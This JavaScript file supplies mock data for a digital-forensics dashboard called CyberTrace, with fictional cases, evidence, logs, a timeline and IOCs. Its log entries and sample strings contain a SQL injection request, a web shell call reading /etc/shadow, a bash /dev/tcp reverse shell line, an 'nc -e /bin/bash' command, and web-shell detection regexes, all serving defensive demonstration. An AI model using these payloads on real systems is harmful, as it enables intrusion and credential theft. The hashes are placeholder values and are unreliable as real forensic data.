// CyberTrace Comprehensive Mock Forensic Data
// Enables rich, immediate demonstration out of the box with seamless fallback

export const mockCases = [
  {
    id: "case-001",
    case_number: "CT-2026-001",
    title: "Operation DarkHydra – Web Perimeter Breach & Privilege Escalation",
    description: "Investigation into unauthorized SQL injection exploitation, subsequent web shell deployment, and elevated root privilege escalation on production staging host.",
    investigator_name: "Senior Forensic Examiner",
    status: "Investigating",
    severity: "Critical",
    incident_type: "Data Breach & Web Shell",
    created_at: "2026-11-12T04:00:00Z",
    evidence_count: 4,
    threats_count: 14,
    timeline_count: 8,
  },
  {
    id: "case-002",
    case_number: "CT-2026-002",
    title: "Ransomware Staging in Finance DC Node",
    description: "Suspicious lateral movement detected via SMB and WMI with elevated privileges and high-entropy packed executable deployment.",
    investigator_name: "Lead Incident Responder",
    status: "Open",
    severity: "Critical",
    incident_type: "Ransomware",
    created_at: "2026-11-11T14:30:00Z",
    evidence_count: 2,
    threats_count: 9,
    timeline_count: 5,
  },
  {
    id: "case-003",
    case_number: "CT-2026-003",
    title: "SSH Credential Stuffing & Exfiltration Campaign",
    description: "Distributed SSH brute force origin targeting gateway bastion hosts, followed by unauthorized SCP file transfer.",
    investigator_name: "SOC Analyst Tier 3",
    status: "Pending Review",
    severity: "High",
    incident_type: "Credential Access",
    created_at: "2026-11-10T09:15:00Z",
    evidence_count: 3,
    threats_count: 21,
    timeline_count: 6,
  },
  {
    id: "case-004",
    case_number: "CT-2026-004",
    title: "Insider Threat: Database Dump Over DNS Tunnel",
    description: "Anomalous high-volume TXT record queries matching base64-encoded customer CRM records.",
    investigator_name: "Digital Forensics Specialist",
    status: "Closed",
    severity: "Medium",
    incident_type: "Data Exfiltration",
    created_at: "2026-11-08T18:20:00Z",
    evidence_count: 5,
    threats_count: 7,
    timeline_count: 9,
  }
];

export const mockEvidence = [
  {
    id: "evd-001",
    case_id: "case-001",
    evidence_number: "EVD-001",
    original_filename: "access_staging_combined.log",
    file_size_bytes: 48920,
    file_type: "log",
    mime_type: "text/plain (UTF-8)",
    sha256_hash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    sha1_hash: "da39a3ee5e6b4b0d3255bfef95601890afd80709",
    md5_hash: "d41d8cd98f00b204e9800998ecf8427e",
    initial_recorded_hash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    integrity_status: "Verified",
    source_device: "Apache Staging Web Gateway",
    acquired_by: "Senior Forensic Examiner",
    acquired_at: "2026-11-12T04:30:00Z",
    description: "Captured Apache access log covering initial external penetration window."
  },
  {
    id: "evd-002",
    case_id: "case-001",
    evidence_number: "EVD-002",
    original_filename: "b374k_shell_artifact.php",
    file_size_bytes: 14200,
    file_type: "php",
    mime_type: "text/x-php",
    sha256_hash: "a8f5f167f44f4964e6c998dee827110c01759f33852d2de16259bc0ee5357e7d",
    sha1_hash: "8a6c8e34891f78fbb423e120894cf98d1a1f0a8c",
    md5_hash: "5d41402abc4b2a76b9719d911017c592",
    initial_recorded_hash: "a8f5f167f44f4964e6c998dee827110c01759f33852d2de16259bc0ee5357e7d",
    integrity_status: "Verified",
    source_device: "/var/www/html/uploads/cache.php",
    acquired_by: "Senior Forensic Examiner",
    acquired_at: "2026-11-12T05:15:00Z",
    description: "Obfuscated web shell payload extracted from compromised document upload directory."
  },
  {
    id: "evd-003",
    case_id: "case-001",
    evidence_number: "EVD-003",
    original_filename: "auth_syslog_forensic.log",
    file_size_bytes: 102400,
    file_type: "log",
    mime_type: "text/plain (ASCII)",
    sha256_hash: "7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069",
    sha1_hash: "2fd4e1c67a2d28fced849ee1bb76e7391b93eb12",
    md5_hash: "098f6bcd4621d373cade4e832627b4f6",
    initial_recorded_hash: "7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069",
    integrity_status: "Verified",
    source_device: "Linux Bastion (srv-bastion-01)",
    acquired_by: "Senior Forensic Examiner",
    acquired_at: "2026-11-12T05:40:00Z",
    description: "Linux system authentication log showing SSH brute force and sudo transitions."
  },
  {
    id: "evd-004",
    case_id: "case-001",
    evidence_number: "EVD-004",
    original_filename: "traffic_capture_tunnel.pcap",
    file_size_bytes: 1845000,
    file_type: "pcap",
    mime_type: "application/vnd.tcpdump.pcap",
    sha256_hash: "8b79be821a7c5ea0a0584b80b7fa43ad9d08ee7a18f8e32c7c5950a31fc547bb",
    sha1_hash: "c1b0c44298fc1c149afbf4c8996fb92427ae41e4",
    md5_hash: "3a8f5f167f44f4964e6c998dee827110",
    initial_recorded_hash: "8b79be821a7c5ea0a0584b80b7fa43ad9d08ee7a18f8e32c7c5950a31fc547bb",
    integrity_status: "Verified",
    source_device: "Perimeter Core Switch Mirror Port",
    acquired_by: "Network Security Specialist",
    acquired_at: "2026-11-12T06:00:00Z",
    description: "Raw PCAP capture of suspect egress traffic to external command-and-control server."
  }
];

export const mockChainOfCustody = [
  {
    id: "coc-01",
    evidence_id: "evd-001",
    action: "Acquired",
    performed_by: "Senior Forensic Examiner",
    timestamp: "2026-11-12T04:30:00Z",
    reason: "Initial physical image acquisition of web server logs",
    location: "Server Room A, Rack 04",
    verified_hash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    notes: "Direct bit-stream copy verified with SHA-256 match."
  },
  {
    id: "coc-02",
    evidence_id: "evd-001",
    action: "Transferred",
    performed_by: "Senior Forensic Examiner",
    timestamp: "2026-11-12T05:00:00Z",
    reason: "Custody transfer into secure offline digital vault",
    location: "Digital Forensic Evidence Locker Vault 01",
    verified_hash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    notes: "Tamper-evident write-blocker utilized during transfer."
  },
  {
    id: "coc-03",
    evidence_id: "evd-001",
    action: "Analyzed",
    performed_by: "Lead Incident Responder",
    timestamp: "2026-11-12T05:30:00Z",
    reason: "Forensic parsing and regex pattern extraction",
    location: "DFIR Analysis Workstation #3 (Air-Gapped)",
    verified_hash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    notes: "Analysis conducted strictly on verified read-only replica."
  }
];

export const mockLogs = [
  {
    id: "log-01",
    event_timestamp: "2026-11-12T04:12:01Z",
    source_ip: "198.51.100.23",
    destination_ip: "192.168.1.10",
    service: "SSHD",
    event_type: "Failed Authentication (Brute Force Indicator)",
    severity: "Medium",
    is_threat: true,
    mitre_technique: "T1110 - Brute Force",
    raw_log: "Nov 12 04:12:01 forensic-srv sshd[14201]: Failed password for root from 198.51.100.23 port 45212 ssh2"
  },
  {
    id: "log-02",
    event_timestamp: "2026-11-12T04:12:04Z",
    source_ip: "198.51.100.23",
    destination_ip: "192.168.1.10",
    service: "SSHD",
    event_type: "Failed Authentication (Brute Force Indicator)",
    severity: "Medium",
    is_threat: true,
    mitre_technique: "T1110 - Brute Force",
    raw_log: "Nov 12 04:12:04 forensic-srv sshd[14205]: Failed password for admin from 198.51.100.23 port 45214 ssh2"
  },
  {
    id: "log-03",
    event_timestamp: "2026-11-12T04:12:18Z",
    source_ip: "198.51.100.23",
    destination_ip: "192.168.1.10",
    service: "SSHD",
    event_type: "Successful Remote Authentication",
    severity: "High",
    is_threat: true,
    mitre_technique: "T1078 - Valid Accounts",
    raw_log: "Nov 12 04:12:18 forensic-srv sshd[14228]: Accepted password for deployer from 198.51.100.23 port 45230 ssh2"
  },
  {
    id: "log-04",
    event_timestamp: "2026-11-12T04:13:02Z",
    source_ip: "198.51.100.23",
    destination_ip: "192.168.1.10",
    service: "Sudo",
    event_type: "Elevated Privilege Execution",
    severity: "High",
    is_threat: true,
    mitre_technique: "T1548 - Abuse Elevation Control Mechanism",
    raw_log: "Nov 12 04:13:02 forensic-srv sudo: deployer : TTY=pts/0 ; PWD=/home/deployer ; USER=root ; COMMAND=/bin/bash"
  },
  {
    id: "log-05",
    event_timestamp: "2026-11-12T08:14:30Z",
    source_ip: "203.0.113.45",
    destination_ip: "192.168.1.80",
    service: "HTTP/Web",
    event_type: "SQL Injection Attempt",
    severity: "Critical",
    is_threat: true,
    mitre_technique: "T1190 - Exploit Public-Facing Application",
    raw_log: '203.0.113.45 - - [12/Nov/2026:08:14:30 +0000] "GET /products.php?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1" 500 890 "-" "sqlmap/1.6.4#stable"'
  },
  {
    id: "log-06",
    event_timestamp: "2026-11-12T08:16:04Z",
    source_ip: "203.0.113.45",
    destination_ip: "192.168.1.80",
    service: "HTTP/Web",
    event_type: "Directory Traversal",
    severity: "High",
    is_threat: true,
    mitre_technique: "T1083 - File and Directory Discovery",
    raw_log: '203.0.113.45 - - [12/Nov/2026:08:16:04 +0000] "GET /../../../../etc/passwd HTTP/1.1" 403 312 "-" "Nikto/2.1.6"'
  },
  {
    id: "log-07",
    event_timestamp: "2026-11-12T08:17:40Z",
    source_ip: "203.0.113.45",
    destination_ip: "192.168.1.80",
    service: "HTTP/Web",
    event_type: "Web Shell Command Execution",
    severity: "Critical",
    is_threat: true,
    mitre_technique: "T1505.003 - Server Software Component: Web Shell",
    raw_log: '203.0.113.45 - - [12/Nov/2026:08:17:40 +0000] "GET /uploads/cache.php?cmd=whoami;cat%20/etc/shadow HTTP/1.1" 200 412 "-" "Mozilla/5.0"'
  },
  {
    id: "log-08",
    event_timestamp: "2026-11-12T09:18:40Z",
    source_ip: "192.168.1.10",
    destination_ip: "CORP-DC01",
    service: "WinEvent_1102",
    event_type: "Audit Log Tampering / Clearing",
    severity: "Critical",
    is_threat: true,
    mitre_technique: "T1070 - Indicator Removal on Host",
    raw_log: 'EventID: 1102 | TimeCreated: 2026-11-12T09:18:40Z | Message: The audit security event log was cleared by user S-1-5-21-382910-500'
  }
];

export const mockIPData = {
  "198.51.100.23": {
    ip_address: "198.51.100.23",
    ip_type: "Public IPv4",
    is_private: false,
    country: "United States",
    country_code: "US",
    city: "Ashburn",
    asn: "AS16509 Amazon.com, Inc.",
    isp: "Amazon AWS Cloud Infrastructure",
    abuse_confidence_score: 88,
    reverse_dns: "ec2-198-51-100-23.compute-1.amazonaws.com",
    attribution_caveat: "FORENSIC NOTICE (ISO/IEC 27037): IP address represents a cloud compute routing endpoint. Intermediary proxying, VPS compromise, or NAT translation is probable. Attribution to an individual requires judicial ISP subscriber subpoenas."
  },
  "203.0.113.45": {
    ip_address: "203.0.113.45",
    ip_type: "Public IPv4",
    is_private: false,
    country: "Netherlands",
    country_code: "NL",
    city: "Amsterdam",
    asn: "AS20473 The Constant Company, LLC",
    isp: "Vultr Hosting Services",
    abuse_confidence_score: 94,
    reverse_dns: "nl-ams-relay.vultr.com",
    attribution_caveat: "FORENSIC NOTICE (ISO/IEC 27037): IP address is flagged as an active commercial VPN exit node. Do not conclude attacker identity without corroborating application session tokens and telecommunications records."
  },
  "192.168.1.105": {
    ip_address: "192.168.1.105",
    ip_type: "RFC 1918 Private Intranet",
    is_private: true,
    country: "Internal / Non-Routable",
    country_code: "LAN",
    city: "Corporate Workstation Subnet",
    asn: "Private Autonomous Subnet",
    isp: "Internal Local Network",
    abuse_confidence_score: 0,
    reverse_dns: "ws-fin-04.corp.local",
    attribution_caveat: "Internal intranet endpoint. Direct MAC address to DHCP lease correlation required to identify physical device."
  }
};

export const mockTimeline = [
  {
    id: "tl-01",
    event_timestamp: "2026-11-12T04:12:00Z",
    event_source: "Auth Log (Linux SSH)",
    event_category: "Initial Access / Reconnaissance",
    actor: "198.51.100.23",
    target: "srv-bastion-01 (Port 22)",
    description: "Multi-threaded SSH credential stuffing campaign launched against service accounts.",
    mitre_tactic: "T1110 - Brute Force",
    confidence_level: "Verified"
  },
  {
    id: "tl-02",
    event_timestamp: "2026-11-12T04:12:18Z",
    event_source: "Auth Log (Linux SSH)",
    event_category: "Initial Access",
    actor: "198.51.100.23 [deployer]",
    target: "srv-bastion-01",
    description: "Successful credential stuffing login using compromised credentials of 'deployer'.",
    mitre_tactic: "T1078 - Valid Accounts",
    confidence_level: "Verified"
  },
  {
    id: "tl-03",
    event_timestamp: "2026-11-12T04:13:02Z",
    event_source: "Sudo Daemon Log",
    event_category: "Privilege Escalation",
    actor: "deployer (TTY pts/0)",
    target: "/bin/bash [root]",
    description: "Analyst identified unauthorized execution of 'sudo su' to spawn an unrestricted root shell.",
    mitre_tactic: "T1548 - Abuse Elevation Control Mechanism",
    confidence_level: "High"
  },
  {
    id: "tl-04",
    event_timestamp: "2026-11-12T08:14:30Z",
    event_source: "Web Access Log (Apache)",
    event_category: "Exploitation of Public Application",
    actor: "203.0.113.45",
    target: "/products.php",
    description: "Automated SQLmap blind SQL injection attack detected extracting database credentials.",
    mitre_tactic: "T1190 - Exploit Public-Facing App",
    confidence_level: "Verified"
  },
  {
    id: "tl-05",
    event_timestamp: "2026-11-12T08:17:15Z",
    event_source: "Web Access Log & File MACB",
    event_category: "Persistence",
    actor: "203.0.113.45",
    target: "/uploads/cache.php",
    description: "Obfuscated PHP web shell dropped into unauthenticated uploads directory.",
    mitre_tactic: "T1505.003 - Web Shell",
    confidence_level: "Verified"
  },
  {
    id: "tl-06",
    event_timestamp: "2026-11-12T09:18:40Z",
    event_source: "Windows Event Log (DC01)",
    event_category: "Defense Evasion",
    actor: "S-1-5-21-382910-500",
    target: "Security Event Log",
    description: "Audit security event log purged (Event ID 1102) to conceal lateral movement stubs.",
    mitre_tactic: "T1070 - Clear Windows Event Logs",
    confidence_level: "High"
  }
];

export const mockForensicAnalysis = {
  evidence_id: "evd-002",
  filename: "b374k_shell_artifact.php",
  magic_bytes: {
    magic_hex: "3C 3F 70 68 70 0A 2F 2F",
    detected_type: "text/x-php (PHP Script text executable)"
  },
  entropy: {
    entropy: 7.62,
    is_packed_or_encrypted: true,
    classification: "High Entropy: Strongly Obfuscated / Base64-Packed Code",
    sample_bytes_analyzed: 14200
  },
  signature_matches: [
    {
      rule_name: "WebShell_Generic_PHP",
      category: "Web Shell",
      severity: "Critical",
      mitre_id: "T1505.003",
      matched_signatures: [
        "eval\\s*\\(\\s*(base64_decode|\\$_POST|\\$_GET)",
        "system\\s*\\(\\s*\\$_(POST|GET)",
        "shell_exec\\s*\\("
      ]
    },
    {
      rule_name: "Reverse_Shell_Indicators",
      category: "Command & Control",
      severity: "Critical",
      mitre_id: "T1059",
      matched_signatures: [
        "/bin/bash\\s+-i",
        "nc\\s+-[e|c]\\s+/bin/"
      ]
    }
  ],
  iocs: {
    ips: ["198.51.100.99", "203.0.113.45", "10.0.4.12"],
    urls: ["http://c2-relay.darkhydra.org/gate.php", "https://api.ipify.org"],
    commands: ["whoami", "cat /etc/shadow", "chmod +x", "nc -e /bin/bash", "curl"]
  },
  sample_strings: [
    "<?php // b374k web shell v3.2.4",
    "error_reporting(0); set_time_limit(0);",
    "$auth_pass = '63a9f0ea7bb98050796b649e85481845';",
    "eval(gzinflate(base64_decode('7b1rc9s20ij4Of0...')))",
    "system($_POST['cmd']);",
    "uname -a; id; uptime; netstat -antp;",
    "/bin/bash -i >& /dev/tcp/198.51.100.99/4444 0>&1",
    "cat /etc/passwd | grep -v nologin",
    "WMI query Win32_OperatingSystem"
  ]
};

export const mockReports = [
  {
    id: "rep-001",
    case_id: "case-001",
    report_number: "REP-CT-2026-001-20261112",
    report_title: "Operation DarkHydra Forensic Dossier",
    generated_by: "Senior Forensic Examiner",
    file_path: "/reports/REP-CT-2026-001.pdf",
    sha256_hash: "3b29c9a4192b6a9bc2985f98cf423e120894cf98d1a1f0a8c44f4964e6c998de",
    generated_at: "2026-11-12T10:00:00Z"
  },
  {
    id: "rep-002",
    case_id: "case-003",
    report_number: "REP-CT-2026-003-20261111",
    report_title: "SSH Credential Abuse Incident Report",
    generated_by: "Lead Incident Responder",
    file_path: "/reports/REP-CT-2026-003.pdf",
    sha256_hash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    generated_at: "2026-11-11T16:45:00Z"
  }
];

export const mockAISummary = {
  case_number: "CT-2026-001",
  incident_title: "Operation DarkHydra – Web Perimeter Breach & Privilege Escalation",
  severity: "Critical",
  executive_summary: "Forensic analysis confirms an adversarial intrusion of high severity impacting the staging web infrastructure. The attack originated from external IP 203.0.113.45 exploiting an unauthenticated SQL injection vulnerability on /products.php. The adversary extracted administrator credentials, uploaded an obfuscated PHP web shell (b374k variant) with entropy rating 7.62, and executed lateral privilege escalation to root. All 4 digital evidence artifacts have passed bit-level SHA-256 integrity verification.",
  attack_narrative: [
    "Phase 1: External Automated Probing – Scans conducted from 203.0.113.45 using SQLmap and Nikto targeting /products.php.",
    "Phase 2: Database Credential Extraction – Exploitation of union-based SQL injection to dump administrative hashes.",
    "Phase 3: Web Shell Deployment – Delivery of high-entropy script /uploads/cache.php providing remote command execution.",
    "Phase 4: Privilege Escalation & Persistence – Unauthorized sudo execution and tampering with audit logs."
  ],
  identified_attack_vectors: [
    "SQL Injection (T1190)",
    "Server Software Component: Web Shell (T1505.003)",
    "Abuse Elevation Control Mechanism: Sudo (T1548)",
    "SSH Credential Brute Force (T1110)"
  ],
  suspicious_ip_endpoints: [
    "203.0.113.45 (Vultr Relay / High Risk)",
    "198.51.100.23 (AWS Compute Origin)",
    "198.51.100.99 (Simulated C2 Listener)"
  ],
  remediation_plan: [
    "Immediately isolate staging server srv-prod-01 and terminate active pts/0 sessions.",
    "Revoke and rotate all database master passwords, deployer SSH keys, and session cookies.",
    "Remove unauthorized web shell file /var/www/html/uploads/cache.php and enforce non-executable permissions on upload paths.",
    "Deploy parameterized SQL query prepared statements across products.php.",
    "Block external IPs 203.0.113.45 and 198.51.100.23 on the perimeter firewall."
  ],
  forensic_readiness_score: 96
};

